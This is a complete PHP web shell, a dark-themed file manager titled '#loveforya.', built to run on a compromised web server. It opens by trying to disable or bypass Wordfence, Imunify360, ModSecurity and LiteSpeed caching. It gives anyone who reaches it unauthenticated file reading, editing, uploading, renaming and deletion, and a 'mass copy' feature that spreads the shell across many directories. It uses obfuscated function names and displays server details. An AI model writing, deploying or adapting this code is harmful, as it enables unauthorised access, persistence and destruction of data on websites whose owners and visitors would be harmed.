<?php
@clearstatcache();
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);

if (function_exists('litespeed_request_headers')) {
    $a = litespeed_request_headers();
    if (isset($a['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}
if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}
if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $a = imunify360_request_headers();
    if (isset($a['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($a['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $a['X-Imunify360-Captcha-Bypass']);
    }
}
if (function_exists('apache_request_headers')) {
    $a = apache_request_headers();
    if (isset($a['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $a['X-Mod-Security']);
    }
}
if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($a['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $a['HTTP_CF_VISITOR']);
    }
}

function qwtninxi114x141($pathvalue, $shellvalue) {
    $result = true;
    $output = [];
    $message = $output;
    $matches = glob($pathvalue, GLOB_ONLYDIR);
    if (!empty($matches)) {
        foreach ($matches as $destDir) {
            if (!file_exists($shellvalue)) {
                $result = false;
                $output[] = "Source file '$shellvalue' does not exist.";
                break;
            }
            $destPath = rtrim($destDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($shellvalue);
            if (!@copy($shellvalue, $destPath)) {
                $result = false;
                $output[] = "Failed to copy '$shellvalue' to '$destPath'.";
            } else {
                $output[] = "Copied '$shellvalue' to '$destPath' successfully.";
            }
        }
    } else {
        $dest = trim($pathvalue);
        if ($dest === '') {
            $result = false;
            $output[] = "Destination path is empty.";
        } else {
            if (!file_exists($shellvalue)) {
                $result = false;
                $output[] = "Source file '$shellvalue' does not exist.";
            } else {
                if (is_dir($dest)) {
                    $destPath = rtrim($dest, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($shellvalue);
                } else {
                    $destPath = $dest;
                }
                if (!@copy($shellvalue, $destPath)) {
                    $result = false;
                    $output[] = "Failed to copy '$shellvalue' to '$destPath'.";
                } else {
                    $output[] = "Copied '$shellvalue' to '$destPath' successfully.";
                }
            }
        }
    }
    return array('success' => $result, 'output' => implode("\n", $output));
}

function wqtqwitnin12i5h12i5($dir) {
    $dir = isset($dir) ? $dir : BASE_DIR;

    $allFiles = scandir($dir);
    $dirs = [];
    $filesArr = [];
    foreach ($allFiles as $file) {
        if ($file === '.' || $file === '..') continue;
        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($fullPath)) {
            $dirs[] = $file;
        } else {
            $filesArr[] = $file;
        }
    }

    sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
    sort($filesArr, SORT_NATURAL | SORT_FLAG_CASE);
    $sorted = array_merge($dirs, $filesArr);
    ob_start(); ?>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($sorted as $file):
                $fullPath = $dir . DIRECTORY_SEPARATOR . $file; ?>
            <tr>
                <td>
                    <?php if (is_dir($fullPath)): ?>
                        <i class="bi bi-folder"></i>
                        <a href="#" onclick="xxqwtxx('<?php echo addslashes($fullPath); ?>'); return false;"><?php echo htmlspecialchars($file); ?></a>
                    <?php else: ?>
                        <i class="bi bi-file-earmark"></i> <?php echo htmlspecialchars($file); ?>
                    <?php endif; ?>
                </td>
                <td><?php echo is_dir($fullPath) ? 'Directory' : 'File'; ?></td>
                <td>
                    <?php if (!is_dir($fullPath)): ?>
                        <a href="#" class="btn-custom" onclick="xmixinb1('<?php echo addslashes($fullPath); ?>'); return false;"><i class="bi bi-file-code"></i> Edit</a> |
                    <?php endif; ?>
                    <a href="#" class="btn-custom" onclick="whanxi('<?php echo addslashes($fullPath); ?>', '<?php echo addslashes($file); ?>'); return false;"><i class="bi bi-pencil-square"></i> Rename</a> |
                    <a href="#" class="btn-custom" onclick="icememtn('<?php echo addslashes($fullPath); ?>'); return false;"><i class="bi bi-trash"></i> Remove</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <?php
    return ob_get_clean();
}

define('BASE_DIR', getcwd());
define('BASE_DRIVE', strtoupper(substr(BASE_DIR, 0, 2)));

$currentDir = isset($_REQUEST['kutapercaya']) ? $_REQUEST['kutapercaya'] : BASE_DIR;
$currentDrive = strtoupper(substr($currentDir, 0, 2));

if ($currentDrive !== BASE_DRIVE) {
    $currentDir = BASE_DIR;
}

if (isset($_GET['node']) || isset($_POST['node'])) {
    $action = isset($_GET['node']) ? $_GET['node'] : $_POST['node'];

    if ($action === 'fetch') {
        $filepath = $_GET['filepath'];
        if (file_exists($filepath) && is_file($filepath)) {
            echo file_get_contents($filepath);
        }
        exit;
    } else if ($action === 'list') {
        $currentDir = isset($_GET['kutapercaya']) ? $_GET['kutapercaya'] : BASE_DIR;
        if (strtoupper(substr($currentDir, 0, 2)) !== BASE_DRIVE) {
            $currentDir = BASE_DIR;
        }
        $tableHTML = wqtqwitnin12i5h12i5($currentDir);
        header('Content-Type: application/json');
        echo json_encode(array('directory' => $currentDir, 'tableHTML' => $tableHTML, 'message' => '', 'success' => true));
        exit;
    } else if ($action === 'upload') {
        if (isset($_POST['filedata'])) {
            $chunkIndex = isset($_POST['dzchunkindex']) ? (int)$_POST['dzchunkindex'] : 0;
            $totalChunks = isset($_POST['dztotalchunkcount']) ? (int)$_POST['dztotalchunkcount'] : 1;
            $targetDir = isset($currentDir) ? $currentDir : BASE_DIR;
            $targetFile = $targetDir . DIRECTORY_SEPARATOR . basename($_POST['filename']);
            $fileData = stripslashes($_POST['filedata']);
            $fileData = base64_decode($fileData);
            $dest = fopen($targetFile, 'ab');
            $uploaded = false;
        
            if ($dest) {
                $source = fopen('php://memory', 'r+');
                fwrite($source, $fileData);
                rewind($source);
                $uploaded = stream_copy_to_stream($source, $dest) !== false;
                fclose($source);
                fclose($dest);
            }
        
            if (!$uploaded) {
                $currentData = fopen($targetFile, 'r+');
                if ($currentData !== false) {
                    fseek($currentData, 0, SEEK_END);
                    $newData = fopen('php://memory', 'r+');
                    fwrite($newData, $fileData);
                    rewind($newData);
                    $uploaded = stream_copy_to_stream($newData, $currentData) !== false;
                    fclose($newData);
                    fclose($currentData);
                }
            }
        
            if (!$uploaded) {
                $message = "Upload failed.";
            }
        }
        $tableHTML = wqtqwitnin12i5h12i5($currentDir);
        header('Content-Type: application/json');
        $message = ($uploaded) ? "Upload successful" : (isset($message) ? $message : "Upload failed");
        echo json_encode(array('directory' => $currentDir, 'tableHTML' => $tableHTML, 'message' => $message, 'success' => (bool)$uploaded));
        exit;
    } else if ($action === 'edit') {
        $currentDir = isset($_POST['kutapercaya']) ? $_POST['kutapercaya'] : BASE_DIR;
        $editSuccess = false;
        if (isset($_POST['filepath']) && isset($_POST['content'])) {
            $filepath = $_POST['filepath'];
            if (is_file($filepath) && is_writable($filepath)) {
                $fp = fopen($filepath, 'w');
                if ($fp) {
                    $written = fwrite($fp, stripslashes($_POST['content']));
                    fclose($fp);
                    $editSuccess = ($written !== false);
                }
            }
        }
        $tableHTML = wqtqwitnin12i5h12i5($currentDir);
        header('Content-Type: application/json');
        $message = $editSuccess ? "Edit successful" : "Edit failed";
        echo json_encode(array('directory' => $currentDir, 'tableHTML' => $tableHTML, 'message' => $message, 'success' => $editSuccess));
        exit;
    } else if ($action === 'rename') {
        $currentDir = isset($_POST['kutapercaya']) ? $_POST['kutapercaya'] : BASE_DIR;
        $renameSuccess = false;
        if (isset($_POST['oldname']) && isset($_POST['newname'])) {
            $oldname = $_POST['oldname'];
            $newname = dirname($oldname) . DIRECTORY_SEPARATOR . $_POST['newname'];
            if (file_exists($oldname)) {
                $renameSuccess = rename($oldname, $newname);
            }
        }
        $tableHTML = wqtqwitnin12i5h12i5($currentDir);
        header('Content-Type: application/json');
        $message = $renameSuccess ? "Rename successful" : "Rename failed";
        echo json_encode(array('directory' => $currentDir, 'tableHTML' => $tableHTML, 'message' => $message, 'success' => $renameSuccess));
        exit;
    } else if ($action === 'remove') {
        $currentDir = isset($_POST['kutapercaya']) ? $_POST['kutapercaya'] : BASE_DIR;
        $removeSuccess = false;
        if (isset($_POST['filepath'])) {
            $filepath = $_POST['filepath'];
            if (file_exists($filepath)) {
                $removeSuccess = unlink($filepath);
            }
        }
        $tableHTML = wqtqwitnin12i5h12i5($currentDir);
        header('Content-Type: application/json');
        $message = $removeSuccess ? "Remove successful" : "Remove failed";
        echo json_encode(array('directory' => $currentDir, 'tableHTML' => $tableHTML, 'message' => $message, 'success' => $removeSuccess));
        exit;
    } else if ($action === 'copycmd') {
        $pathvalue  = isset($_POST['pathvalue']) ? $_POST['pathvalue'] : "";
        $shellvalue = isset($_POST['shellvalue']) ? $_POST['shellvalue'] : "";
        $result = qwtninxi114x141($pathvalue, $shellvalue);
        header('Content-Type: application/json');
        echo json_encode($result);
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>#loveforya.</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
    <link href="https://fonts.googleapis.com/css2?family=Space+Mono" rel="stylesheet">
    <style>
body {
    font-family: 'Space Mono', monospace;
    margin: 20px;
    background-color: #121212;
    color: #e0e0e0;
}

table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 10px;
}

thead tr {
    border-bottom: 1px solid #444;
}

th, td {
    padding: 8px;
}

table th:nth-child(2), table th:nth-child(3),
table td:nth-child(2), table td:nth-child(3) {
    text-align: center;
}

tr {
    border: none;
}

a {
    color: #e0e0e0;
    text-decoration: none;
}

a:hover {
    color: #FF4191;
}

#editDiv, #renameDiv, #removeDiv, #copyCmdBox {
    border: 1px solid #666;
    padding: 10px;
    margin-top: 10px;
    background: #1e1e1e;
    max-width: 100%;
    box-sizing: border-box;
    width: 100%;
}

#editDiv {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    gap: 10px;
}

#editDiv input, #editDiv textarea {
    background-color: #333;
    color: #e0e0e0;
    border: 1px solid #555;
    width: 100%;
    padding: 0.5rem;
    margin-top: 8px;
    font-family: 'Ubuntu Mono', monospace;
}

#copyCmdBox {
    margin: 20px auto;
    width: 50%;
    text-align: center;
}

#copyCmdForm input[type="text"] {
    width: 100%;
    max-width: 400px;
    padding: 0.5rem;
    margin: 0.25rem 0;
    box-sizing: border-box;
    font-family: 'Ubuntu Mono', monospace;
    background-color: #333;
    color: #e0e0e0;
    border: 1px solid #555;
}

#statusMessage {
    margin-bottom: 10px;
    font-weight: bold;
    color: #FFB22C;
}

button, input[type="submit"] {
    display: inline-flex;
    align-items: center;
    padding: 0.375rem 0.75rem;
    margin: 4px 0;
    border: 1px solid #555;
    border-radius: 4px;
    background-color: #333;
    cursor: pointer;
    font-size: 1rem;
    font-family: 'Ubuntu Mono', monospace;
    color: #e0e0e0;
    text-decoration: none;
    transition: background-color 0.2s;
}

button:hover, input[type="submit"]:hover {
    background-color: #444;
}

button i, input[type="submit"] i {
    margin-right: 6px;
}

.btn-custom {
    display: inline-flex;
    align-items: center;
    border: 1px solid #555;
    border-radius: 4px;
    padding: 0.25rem 0.5rem;
    margin: 0 2px;
    background-color: #333;
    cursor: pointer;
    font-size: 0.9rem;
    color: #e0e0e0;
    text-decoration: none;
    transition: background-color 0.2s;
}

.btn-custom:hover {
    background-color: #444;
}

.btn-custom i {
    margin-right: 4px;
}

.center-button {
    display: block;
    margin: 10px auto;
}

.file-label {
    display: inline-flex;
    align-items: center;
    padding: 0.375rem 0.75rem;
    margin: 4px 0;
    border: 1px solid #555;
    border-radius: 4px;
    background-color: #333;
    cursor: pointer;
    font-size: 1rem;
    font-family: 'Ubuntu Mono', monospace;
    color: #e0e0e0;
    text-decoration: none;
    transition: background-color 0.2s;
}

.file-label:hover {
    background-color: #444;
}

.file-label i {
    margin-right: 6px;
}

#uploadFile {
    display: none;
}

.fileContent {
    color: #d3d3d3;
    background-color: #2a2a2a;
    padding: 10px;
    border-radius: 5px;
    font-size: 0.95rem;
    line-height: 1.4;
    overflow-x: auto;
    white-space: pre-wrap;
}

#renameNewName {
    background-color: #333;
    color: #e0e0e0;
    border: 1px solid #555;
    padding: 0.5rem;
    font-family: 'Ubuntu Mono', monospace;
    width: 100%;
    margin-top: 8px;
}
    </style>
</head>
<body>
<table class="table table-sm table-borderless table-light">
                        <tr>
                            <td>SERVER  : <?= isset($_SERVER['SERVER_SOFTWARE']) ? php_uname() : "NOT FOUND"; ?></td>
                        </tr>
                        <tr>
                            <td>IP &nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;<?= gethostbyname($_SERVER['HTTP_HOST']) ?></td>
                        </tr>
                        <tr>
                            <td>PWD &nbsp;&nbsp;&nbsp;:&nbsp;<span id="currentDirDisplay"><?php echo htmlspecialchars($currentDir); ?></span></td>
                        </tr>
                        <tr>
<tr>
    <td><div id="statusMessage"></div>
    <form id="uploadForm" enctype="multipart/form-data">
        <label for="uploadFile" class="file-label">
            <i class="bi bi-folder-plus"></i> Choose File
        </label>
        <input type="file" name="uploadFile" id="uploadFile">
    </form></td>
    </tr>
    <tr>
        <td style="text-align: center;"><div id="breadcrumbs"></div></td>
    </tr>
    </table><br>
    <button type="button" class="center-button" onclick="beabaddet()">
        <i class="bi bi-clipboard"></i> MASS COPY FILE
    </button>
    <div id="copyCmdBox" style="display:none;">
        <h3>Mass Copy File</h3>
        <form id="copyCmdForm">
            <label for="pathvalue">Path Value:</label>
            <input type="text" name="pathvalue" id="pathvalue" placeholder="E.g. D:/RENA/*/ or single path"><br>
            <label for="shellvalue">Shell Value:</label>
            <input type="text" name="shellvalue" id="shellvalue" placeholder="E.g. D:/source/myfile.txt"><br>
            <button type="submit"><i class="bi bi-check-circle"></i>Execute</button>
            <button type="button" onclick="beabaddet()"><i class="bi bi-x-circle"></i>Close</button>
        </form>
    </div>
    <div id="editDiv" style="display:none;">
        <h3>Edit File: <span id="editFileName"></span></h3>
        <form id="editForm">
            <input type="hidden" name="filepath" id="editFilePath">
            <input type="hidden" name="kutapercaya" id="editDir">
            <textarea name="content" id="fileContent" style="width:99%; height:300px;"></textarea><br>
            <button type="submit"><i class="bi bi-save"></i>Save</button>
            <button type="button" onclick="closeEdit()"><i class="bi bi-x-circle"></i>Cancel</button>
        </form>
    </div>
    <div id="renameDiv" style="display:none;">
        <h3>Rename File: <span id="oldFileName"></span></h3>
        <form id="renameForm">
            <input type="hidden" name="oldname" id="renameOldName">
            <input type="hidden" name="kutapercaya" id="renameDir">
            <input type="text" name="newname" id="renameNewName" placeholder="New name" style="width:99%;">
            <button type="submit"><i class="bi bi-pencil-square"></i>Rename</button>
            <button type="button" onclick="closeRename()"><i class="bi bi-x-circle"></i>Cancel</button>
        </form>
    </div>
    <div id="removeDiv" style="display:none;">
        <h3>Remove File</h3>
        <form id="removeForm">
            <input type="hidden" name="filepath" id="removeFilePath">
            <input type="hidden" name="kutapercaya" id="removeDir">
            Are you sure you want to remove <span id="removeFileName"></span> ?<br>
            <br>
            <button type="submit"><i class="bi bi-trash"></i>Yes, Remove</button>
            <button type="button" onclick="twqihtqibixdx()"><i class="bi bi-x-circle"></i>Cancel</button>
        </form>
    </div>
    <div id="fileListContainer">
        <?php echo wqtqwitnin12i5h12i5($currentDir); ?>
    </div>
    <script>
        var CWD = "<?php echo addslashes($currentDir); ?>";
        function updateStatus(message, success) {
            var statusDiv = document.getElementById("statusMessage");
            statusDiv.innerText = message;
            statusDiv.style.color = success ? "limegreen" : "red";
        }
        function escapeHtml(text) {
            var map = {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};
            return text.replace(/[&<>"']/g,function(m){return map[m];});
        }
        function whanxixx1x() {
            var breadcrumbsDiv = document.getElementById("breadcrumbs");
            var normalized = CWD.replace(/\\/g,"/");
            var parts = normalized.split("/");
            var cumulative = "";
            var html = "";
            for(var i=0;i<parts.length;i++){
                if(i===0){
                    cumulative = parts[i];
                    html += '<a href="#" onclick="xxqwtxx(\''+cumulative+'\');return false;">'+escapeHtml(parts[i])+'</a>';
                } else {
                    cumulative += "/" + parts[i];
                    html += ' / <a href="#" onclick="xxqwtxx(\''+cumulative+'\');return false;">'+escapeHtml(parts[i])+'</a>';
                }
            }
            breadcrumbsDiv.innerHTML = html;
        }
        function xxqwtxx(dir) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET","<?php echo $_SERVER['PHP_SELF']; ?>?swa&node=list&kutapercaya="+encodeURIComponent(dir),true);
            xhr.onreadystatechange = function(){
                if(xhr.readyState===4 && xhr.status===200){
                    var resp = JSON.parse(xhr.responseText);
                    CWD = resp.directory;
                    document.getElementById("currentDirDisplay").innerText = CWD;
                    document.getElementById("fileListContainer").innerHTML = resp.tableHTML;
                    whanxixx1x();
                    updateStatus(resp.message, resp.success);
                }
            };
            xhr.send();
        }
    document.getElementById("uploadForm").addEventListener("change", function(e){
    e.preventDefault();
    var form = document.getElementById("uploadForm");
    var fileInput = document.getElementById("uploadFile");
    var file = fileInput.files[0];
    
    if (!file) {
        document.getElementById("statusMessage").innerHTML = "Please select a file first.";
        document.getElementById("statusMessage").style.color = "red";
        return;
    }
    var reader = new FileReader();

    reader.onloadend = function() {
        var base64FileData = reader.result.split(',')[1];
        var formData = new FormData();
        formData.append('swa');
        formData.append('node', 'upload');
        formData.append('filedata', base64FileData);
        formData.append('filename', file.name);
        formData.append('kutapercaya', CWD);

        document.getElementById("fileListContainer").innerHTML = "<p>Uploading...</p>";

        var xhr = new XMLHttpRequest();
        xhr.open("POST", "<?php echo $_SERVER['PHP_SELF']; ?>", true);
        xhr.onreadystatechange = function() {
            if(xhr.readyState === 4 && xhr.status === 200) {
                var resp = JSON.parse(xhr.responseText);
                document.getElementById("fileListContainer").innerHTML = resp.tableHTML;
                whanxixx1x();
                updateStatus(resp.message, resp.success);
                document.getElementById("uploadForm").reset();
                document.querySelector("label[for='uploadFile']").innerHTML = "<i class='bi bi-folder-plus'></i> Choose File";
            }
        };
        xhr.send(formData);
    };
    reader.readAsDataURL(file);
        });
        function xmixinb1(filePath){
            var xhr = new XMLHttpRequest();
            xhr.open("GET","<?php echo $_SERVER['PHP_SELF']; ?>?swa&node=fetch&filepath="+encodeURIComponent(filePath),true);
            xhr.onreadystatechange = function(){
                if(xhr.readyState===4 && xhr.status===200){
                    document.getElementById("fileContent").value = xhr.responseText;
                    document.getElementById("editFilePath").value = filePath;
                    document.getElementById("editDir").value = CWD;
                    var parts = filePath.split("/");
                    document.getElementById("editFileName").innerText = parts[parts.length-1];
                    document.getElementById("editDiv").style.display = "block";
                    document.getElementById("removeDiv").style.display = "none";
                    document.getElementById("renameDiv").style.display = "none";
                    window.scrollTo(0, 0);
                }
            };
            xhr.send();
        }
        function closeEdit(){
            document.getElementById("editDiv").style.display = "none";
        }
        document.getElementById("editForm").addEventListener("submit", function(e){
            e.preventDefault();
            var formData = new FormData(document.getElementById("editForm"));
            formData.append('swa');
            formData.append('node', "edit");
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "<?php echo $_SERVER['PHP_SELF']; ?>", true);
            xhr.onreadystatechange = function(){
                if(xhr.readyState===4 && xhr.status===200){
                    var resp = JSON.parse(xhr.responseText);
                    document.getElementById("fileListContainer").innerHTML = resp.tableHTML;
                    whanxixx1x();
                    updateStatus(resp.message, resp.success);
                    closeEdit();
                }
            };
            xhr.send(formData);
        });
        function whanxi(filePath, fileName){
            document.getElementById("renameOldName").value = filePath;
            document.getElementById("oldFileName").innerText = fileName;
            document.getElementById("renameNewName").value = fileName;
            document.getElementById("renameDir").value = CWD;
            document.getElementById("renameDiv").style.display = "block";
            document.getElementById("removeDiv").style.display = "none";
            document.getElementById("editDiv").style.display = "none";
            window.scrollTo(0, 0);
        }
        function closeRename(){
            document.getElementById("renameDiv").style.display = "none";
        }
        document.getElementById("renameForm").addEventListener("submit", function(e){
            e.preventDefault();
            var formData = new FormData(document.getElementById("renameForm"));
            formData.append('swa');
            formData.append('node', "rename");
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "<?php echo $_SERVER['PHP_SELF']; ?>", true);
            xhr.onreadystatechange = function(){
                if(xhr.readyState===4 && xhr.status===200){
                    var resp = JSON.parse(xhr.responseText);
                    document.getElementById("fileListContainer").innerHTML = resp.tableHTML;
                    whanxixx1x();
                    updateStatus(resp.message, resp.success);
                    closeRename();
                }
            };
            xhr.send(formData);
        });
        function icememtn(filePath){
            document.getElementById("removeFilePath").value = filePath;
            document.getElementById("removeDir").value = CWD;
            var parts = filePath.split("/");
            document.getElementById("removeFileName").innerText = parts[parts.length-1];
            document.getElementById("removeDiv").style.display = "block";
            document.getElementById("editDiv").style.display = "none";
            document.getElementById("renameDiv").style.display = "none";
            window.scrollTo(0, 0);
        }
        function twqihtqibixdx(){
            document.getElementById("removeDiv").style.display = "none";
        }
        document.getElementById("removeForm").addEventListener("submit", function(e){
            e.preventDefault();
            var formData = new FormData(document.getElementById("removeForm"));
            formData.append('swa');
            formData.append('node', "remove");
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "<?php echo $_SERVER['PHP_SELF']; ?>", true);
            xhr.onreadystatechange = function(){
                if(xhr.readyState===4 && xhr.status===200){
                    var resp = JSON.parse(xhr.responseText);
                    document.getElementById("fileListContainer").innerHTML = resp.tableHTML;
                    whanxixx1x();
                    updateStatus(resp.message, resp.success);
                    twqihtqibixdx();
                }
            };
            xhr.send(formData);
        });
        function beabaddet(){
            var box = document.getElementById("copyCmdBox");
            if(box.style.display==="none" || box.style.display===""){
                box.style.display = "block";
            } else {
                box.style.display = "none";
            }
        }
        document.getElementById("copyCmdForm").addEventListener("submit", function(e){
            e.preventDefault();
            var formData = new FormData(document.getElementById("copyCmdForm"));
            formData.append('swa');
            formData.append('node', "copycmd");
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "<?php echo $_SERVER['PHP_SELF']; ?>", true);
            xhr.onreadystatechange = function(){
                if(xhr.readyState===4 && xhr.status===200){
                    var resp = JSON.parse(xhr.responseText);
                    updateStatus(resp.output, resp.success);
                }
            };
            xhr.send(formData);
        });
        document.getElementById("uploadFile").addEventListener("change", function(){
            var label = document.querySelector("label[for='uploadFile']");
            if(this.files && this.files.length > 0){
                label.innerHTML = "<i class='bi bi-folder-plus'></i> " + this.files[0].name;
            } else {
                label.innerHTML = "<i class='bi bi-folder-plus'></i> Choose File";
            }
        });
        window.onload = function(){
            whanxixx1x();
        };
    </script>
</body>
</html>
